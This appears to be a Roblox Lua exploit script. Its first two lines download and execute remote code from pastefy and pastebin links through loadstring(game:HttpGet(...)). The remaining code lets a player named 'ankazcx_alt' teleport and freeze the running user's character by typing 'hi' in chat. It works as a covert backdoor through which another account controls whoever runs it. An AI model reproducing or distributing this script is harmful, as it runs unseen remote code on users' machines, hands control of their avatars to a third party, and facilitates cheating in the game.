loadstring(game:HttpGet('https://pastefy.app/4bSte7fF/raw'))()
loadstring(game:HttpGet('https://pastebin.com/raw/Vg6AZbZE'))()
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local function onPlayerAdded(player)
    player.Chatted:Connect(function(message)
        if player.Name == "ankazcx_alt" and message:lower() == "hi" then
            local myChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
            local myRoot = myChar:WaitForChild("HumanoidRootPart")

            local targetChar = player.Character
            if targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                myRoot.CFrame = targetChar.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
                myRoot.Anchored = true
            end
        end
    end)
end

for _, player in pairs(Players:GetPlayers()) do
    if player.Name == "ankazcx_alt" then
        onPlayerAdded(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player.Name == "ankazcx_alt" then
        onPlayerAdded(player)
    end
end)
